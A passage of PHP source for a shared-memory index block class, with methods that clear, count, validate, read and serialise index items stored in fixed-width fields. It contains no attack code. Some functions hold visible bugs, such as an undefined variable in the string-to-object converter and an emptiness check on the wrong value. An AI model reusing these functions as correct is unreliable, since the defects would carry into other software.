                        $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $_indexes_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::TYPE_CONTENT_STRING );
                        if ( empty( $_write_length ) ) {
                            throw new \Exception( "delete indexes_item is error , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        if ( ! empty( $exit ) ) {
                            return;
                        }
                    }
                }
            }
        }
    }

    public static function clear_indexes_item_by_block_key ( $key , $indexes_item_block_key , $exit = 0 )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item              = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name   = substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
                $_indexes_item_block_key    = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
                $_indexes_item_content_size = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE );
                $_indexes_item_block_type   = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) {
                    $_indexes_item_block_key = Class_Base_Format::format_key_read ( $_indexes_item_block_key );
                    if ( $_indexes_item_block_key == $indexes_item_block_key ) {
                        $_indexes_item_block_type = Class_Base_Format::format_type_read ( $_indexes_item_block_type );
                        if ( $_indexes_item_block_type != self::TYPE_BLOCK_DATA ) {
                            throw new \Exception( "Cannot delete indexes_item , block_type is not equal to block_data , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        $_indexes_item_content_size = Class_Base_Format::format_size_read ( $_indexes_item_content_size );
                        $_bool                      = Class_Base_Memory::clear_share_memory_by_key ( $_indexes_item_block_key , $_indexes_item_content_size );
                        if ( empty( $_bool ) ) {
                            throw new \Exception( "delete indexes_item is error , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        $_indexes_item = Class_Base_Format::string_to_data ( null , self::SIZE_MAP_ITEM );
                        $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $_indexes_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::TYPE_CONTENT_STRING );
                        if ( empty( $_write_length ) ) {
                            throw new \Exception( "delete indexes_item is error , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        if ( ! empty( $exit ) ) {
                            return;
                        }
                    }
                }
            }
        }
    }

    public static function clear_indexes_item_by_block_name ( $key , $indexes_item_block_name , $exit = 0 )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item              = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name   = substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
                $_indexes_item_block_key    = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
                $_indexes_item_content_size = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE );
                $_indexes_item_block_type   = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE );
                if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( $_indexes_item_block_name );
                    if ( $_indexes_item_block_name == $indexes_item_block_name ) {
                        $_indexes_item_block_type = Class_Base_Format::format_type_read ( $_indexes_item_block_type );
                        if ( $_indexes_item_block_type != self::TYPE_BLOCK_DATA ) {
                            throw new \Exception( "Cannot delete indexes_item , block_type is not equal to block_data , block_key ( " . $_indexes_item_block_name . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        $_indexes_item_content_size = Class_Base_Format::format_size_read ( $_indexes_item_content_size );
                        $_bool                      = Class_Base_Memory::clear_share_memory_by_key ( $_indexes_item_block_key , $_indexes_item_content_size );
                        if ( empty( $_bool ) ) {
                            throw new \Exception( "delete indexes_item is error , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        $_indexes_item = Class_Base_Format::string_to_data ( null , self::SIZE_MAP_ITEM );
                        $_write_length = Class_Base_Memory::write_share_memory ( $_block_id , $_indexes_item , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::TYPE_CONTENT_STRING );
                        if ( empty( $_write_length ) ) {
                            throw new \Exception( "delete indexes_item is error , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) , content_size ( " . $_indexes_item_content_size . " ) , block_type ( " . $_indexes_item_block_type . " ) " , 0 );
                        }
                        if ( ! empty( $exit ) ) {
                            return;
                        }
                    }
                }
            }
        }
    }

    public static function check_indexes_item_block_key_and_block_name ( $memory_block_key , $object_block_key , $memory_block_name , $object_block_name )
    {
        if ( ( ( $object_block_key == $memory_block_key ) && ( $object_block_name != $memory_block_name ) ) || ( ( $object_block_key != $memory_block_key ) && ( $object_block_name == $memory_block_name ) ) ) {
            throw new \Exception( "indexes item block_key or block_name is error , memory block_key ( " . $memory_block_key . " ) , memory block_name ( " . $memory_block_name . " ) , object block_key ( " . $object_block_key . " ) , object block_name ( " . $object_block_name . " ) " , 0 );
        }
    }

    public static function get_indexes_item_block_key_count ( $key , $indexes_item_block_key )
    {
        $_count    = 0;
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item_block_key = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY , self::TYPE_CONTENT_STRING );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) {
                    $_indexes_item_block_key = Class_Base_Format::format_key_read ( $_indexes_item_block_key );
                    if ( $_indexes_item_block_key == $indexes_item_block_key ) {
                        $_count++;
                    }
                }
            }
        }
        return $_count;
    }

    public static function get_indexes_item_block_name_count ( $key , $indexes_item_block_name )
    {
        $_count    = 0;
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item_block_name = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME , self::TYPE_CONTENT_STRING );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( $_indexes_item_block_name );
                    if ( $_indexes_item_block_name == $indexes_item_block_name ) {
                        $_count++;
                    }
                }
            }
        }
        return $_count;
    }


    public static function check_indexes_item_block_name_is_empty_by_block_key ( $key , $indexes_item_block_key )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item            = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name = substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
                $_indexes_item_block_key  = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) {
                    $_indexes_item_block_key = Class_Base_Format::format_key_read ( $_indexes_item_block_key );
                    if ( $_indexes_item_block_key == $indexes_item_block_key ) {
                        if ( Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) {
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }

    public static function check_indexes_item_block_key_is_empty_by_block_name ( $key , $indexes_item_block_name )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item            = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name = substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
                $_indexes_item_block_key  = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
                if ( ! Class_Base_Format::is_empty ( $indexes_item_block_name ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( $_indexes_item_block_name );
                    if ( $_indexes_item_block_name == $indexes_item_block_name ) {
                        if ( Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) {
                            return true;
                        }
                    }
                }
            }
        }
        return false;
    }

    public static function check_indexes ( $key )
    {
        $_block_key_list  = array ();
        $_block_name_list = array ();
        $_block_id        = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item            = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name = substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
                $_indexes_item_block_key  = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
                if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) && ( Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) ) {
                    throw new \Exception( "indexes item block_name is empty , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) " , 0 );
                }
                if ( ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) && ( Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) ) {
                    throw new \Exception( "indexes item block_key is empty , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) " , 0 );
                }
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) {
                    $_indexes_item_block_key = Class_Base_Format::format_key_read ( $_indexes_item_block_key );
                    if ( ! in_array ( $_indexes_item_block_key , $_block_key_list ) ) {
                        $_block_key_list[] = $_indexes_item_block_key;
                    } else {
                        throw new \Exception( "The same number of indexes_item_block_key is greater than one , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) " , 0 );
                    }
                }
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( $_indexes_item_block_name );
                    if ( ! in_array ( $_indexes_item_block_name , $_block_name_list ) ) {
                        $_block_name_list[] = $_indexes_item_block_name;
                    } else {
                        throw new \Exception( "The same number of indexes_item_block_name is greater than one , block_key ( " . $_indexes_item_block_key . " ) , block_name ( " . $_indexes_item_block_name . " ) " , 0 );
                    }
                }
            }
        }
    }

    public static function check_indexes_for_clear ( $key )
    {
        $_block_id = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item ) ) {
                    $_indexes_item_block_name   = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) );
                    $_indexes_item_block_key    = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) );
                    $_indexes_item_content_size = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE ) );
                    $_indexes_item_block_mode   = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) );
                    $_indexes_item_block_type   = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE ) );
                    $_indexes_item_content_type = Class_Base_Format::format_name_read ( substr ( $_indexes_item , ( self::OFFSET_BLOCK_INDEXES_ITEM_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE ) );
                    throw new \Exception( "There is sub-data under indexes, so the current indexes cannot be cleared, indexes key( " . $key . " ) , indexes_item_block_key ( " . $_indexes_item_block_key . " ) , indexes_item_block_name ( " . $_indexes_item_block_name . " ) , indexes_item_content_size ( " . $_indexes_item_content_size . " ) , indexes_item_block_mode ( " . $_indexes_item_block_mode . " ) , indexes_item_block_type ( " . $_indexes_item_block_type . " ) , indexes_item_content_type ( " . $_indexes_item_content_type . " ) " , 0 );
                }
            }
        }
        return true;
    }

    public static function check_indexes_by_block_key_and_block_name ( $key , $indexes_item_block_key , $indexes_item_block_name )
    {
        $_block_key_count  = 0;
        $_block_name_count = 0;
        $_block_id         = self::get_block ( $key );
        if ( ! self::is_empty ( $_block_id ) ) {
            for ( $index = 0 ; $index < self::SIZE_MAP ; $index += self::SIZE_MAP_ITEM ) {
                $_indexes_item            = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD + $index ) , self::SIZE_MAP_ITEM , self::TYPE_CONTENT_STRING );
                $_indexes_item_block_name = substr ( $_indexes_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
                $_indexes_item_block_key  = substr ( $_indexes_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) {
                    $_indexes_item_block_key = Class_Base_Format::format_key_read ( $_indexes_item_block_key );
                    if ( $_indexes_item_block_key == $indexes_item_block_key ) {
                        $_block_key_count++;
                        if ( Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) {
                            return false;
                        }
                    }
                }
                if ( ! Class_Base_Format::is_empty ( $_indexes_item_block_name ) ) {
                    $_indexes_item_block_name = Class_Base_Format::format_name_read ( $_indexes_item_block_name );
                    if ( $_indexes_item_block_name == $indexes_item_block_name ) {
                        $_block_name_count++;
                        if ( Class_Base_Format::is_empty ( $_indexes_item_block_key ) ) {
                            return false;
                        }
                    }
                }
            }
        }
        if ( $_block_key_count > 1 ) {
            return false;
        }
        if ( $_block_name_count > 1 ) {
            return false;
        }
        return true;
    }

    public static function get_end_flag_size ()
    {
        return Class_Base_BlockEndFlag::get_end_flag_size ();
    }

    public static function is_empty ( $data )
    {
        $_ret = Class_Base_Format::is_empty ( $data );
        return $_ret;
    }

    public static function get_block ( $key )
    {
        $_block_id = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::SIZE_BLOCK );
        if ( ! empty( $_block_id ) ) {
            self::add_indexes_key ( $key );
        }
        return $_block_id;
    }

    public static function read_block_string ( $key )
    {

        $_block_id = self::get_block ( $key );
        if ( self::is_empty ( $_block_id ) ) {
            return null;
        }
        $_block_string = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , self::SIZE_BLOCK , self::TYPE_CONTENT_STRING );
        return $_block_string;
    }

    public static function create_head ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag )
    {
        $_head = Class_Base_BlockHead::create_block_head ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag );
        return $_head;
    }

    public static function create_content ( $content )
    {
        $_content = Class_Base_BlockContent::create_block_content ( $content , self::get_content_size () );
        return $_content;
    }

    public static function create_end_flag ( $end_flag )
    {
        $_end_flag = Class_Base_BlockEndFlag::create_block_end_flag ( $end_flag );
        return $_end_flag;
    }

    public static function create_block_object ( $head , $content , $end_flag )
    {
        $_block_keys = new Class_Base_Block_Indexes( $head , $content , $end_flag );
        return $_block_keys;
    }

    public static function init_block_data ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag , $content , $end_flag )
    {
        $_head          = self::create_head ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag );
        $_content       = self::create_content ( $content );
        $_end_flag      = self::create_end_flag ( $end_flag );
        $_block_indexes = self::create_block_object ( $_head , $_content , $_end_flag );
        $_block_string  = $_block_indexes->create_block_string ();
        $_block_id      = Class_Base_Memory::open_share_memory ( $key , Class_Base_Memory::MODE_SHARE_MEMORY_READ_AND_WRITE , self::get_block_size () );
        $_length        = Class_Base_Memory::write_share_memory ( $_block_id , $_block_string , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , self::TYPE_CONTENT_STRING );
        return $_length;
    }

    public static function read_head ( $key )
    {

        $_block_id = self::get_block ( $key );
        if ( self::is_empty ( $_block_id ) ) {
            return null;
        }
        $_head = Class_Base_Memory::read_share_memory ( $_block_id , Class_Base_Memory::SHARE_MEMORY_OFFSET_START , Class_Base_BlockHead::SIZE_BLOCK_HEAD , self::TYPE_CONTENT_STRING );
        return $_head;
    }

    public static function read_content ( $key )
    {

        $_block_id = self::get_block ( $key );
        if ( self::is_empty ( $_block_id ) ) {
            return null;
        }
        $_data = Class_Base_Memory::read_share_memory ( $_block_id , ( Class_Base_BlockHead::SIZE_BLOCK_HEAD ) , self::SIZE_MAP , self::TYPE_CONTENT_STRING );
        return $_data;
    }

    public static function read_end_flag ( $key )
    {

        $_block_id = self::get_block ( $key );
        if ( self::is_empty ( $_block_id ) ) {
            return null;
        }
        $_end_flag = Class_Base_Memory::read_share_memory ( $_block_id , ( self::SIZE_BLOCK - Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG ) , Class_Base_BlockEndFlag::SIZE_BLOCK_END_FLAG , self::TYPE_CONTENT_STRING );
        return $_end_flag;
    }

    public static function check_indexes_item_object ( $indexes_item )
    {
        if ( ( empty( $indexes_item ) ) || ( ! is_object ( $indexes_item ) ) || ( ! ( $indexes_item instanceof Class_Base_Block_IndexesItem ) ) ) {
            throw new \Exception( "indexes item is error" , 0 );
        }
    }

    public static function check_indexes_item_string ( $indexes_item )
    {
        if ( ( ! is_string ( $indexes_item ) ) || ( strlen ( $indexes_item ) != self::SIZE_BLOCK_INDEXES_ITEM ) ) {
            throw new \Exception( "indexes item is error" , 0 );
        }
    }

    public static function indexes_item_object_to_indexes_item_string ( $indexes_item )
    {
        if ( ( empty( $indexes_item ) ) || ( ! is_object ( $indexes_item ) ) || ( ! ( $indexes_item instanceof Class_Base_Block_IndexesItem ) ) ) {
            throw new \Exception( "indexes item is error" , 0 );
        }
        self::check_indexes_item_object ( $indexes_item );
        $_item_block_name   = Class_Base_Format::format_name_write ( $indexes_item->get_block_name () , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME );
        $_item_block_key    = Class_Base_Format::format_name_write ( $indexes_item->get_block_key () , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY );
        $_item_content_size = Class_Base_Format::format_name_write ( $indexes_item->get_content_size () , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE );
        $_item_block_status = Class_Base_Format::format_name_write ( $indexes_item->get_block_status () , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS );
        $_item_block_mode   = Class_Base_Format::format_name_write ( $indexes_item->get_block_mode () , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE );
        $_item_block_type   = Class_Base_Format::format_name_write ( $indexes_item->get_block_type () , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE );
        $_item_content_type = Class_Base_Format::format_name_write ( $indexes_item->get_content_type () , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE );
        $_item_reserved     = Class_Base_Format::format_name_write ( $indexes_item->get_reserved () , self::SIZE_BLOCK_INDEXES_ITEM_RESERVED );
        $_item_end_flag     = Class_Base_Format::format_name_write ( $indexes_item->get_item_end_flag () , self::SIZE_BLOCK_INDEXES_ITEM_END_FLAG );
        $_item              = ( $_item_block_name . $_item_block_key . $_item_content_size . $_item_block_status . $_item_block_mode . $_item_block_type . $_item_content_type . $_item_reserved . $_item_end_flag );
        self::check_indexes_item_string ( $_item );
        return $_item;
    }

    public static function indexes_item_string_to_indexes_item_object ( $indexes_item )
    {
        if ( ( ! is_string ( $indexes_item ) ) || ( strlen ( $indexes_item ) != self::SIZE_BLOCK_INDEXES_ITEM ) ) {
            throw new \Exception( "indexes item is error" , 0 );
        }
        self::check_indexes_item_string ( $indexes_item );
        $_item_block_name   = Class_Base_Format::format_name_read ( substr ( $_item , ( self::OFFSET_START ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) );
        $_item_block_key    = Class_Base_Format::format_key_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) );
        $_item_content_size = Class_Base_Format::format_size_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE ) );
        $_item_block_status = Class_Base_Format::format_status_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS ) );
        $_item_block_mode   = Class_Base_Format::format_mode_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) );
        $_item_block_type   = Class_Base_Format::format_type_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE ) , self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE ) );
        $_item_content_type = Class_Base_Format::format_type_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE ) , self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE ) );
        $_item_reserved     = Class_Base_Format::format_reserved_read ( substr ( $_item , ( self::OFFSET_START + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_NAME + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_KEY + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_SIZE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_STATUS + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_MODE + self::SIZE_BLOCK_INDEXES_ITEM_BLOCK_TYPE + self::SIZE_BLOCK_INDEXES_ITEM_CONTENT_TYPE ) , self::SIZE_BLOCK_INDEXES_ITEM_RESERVED ) );
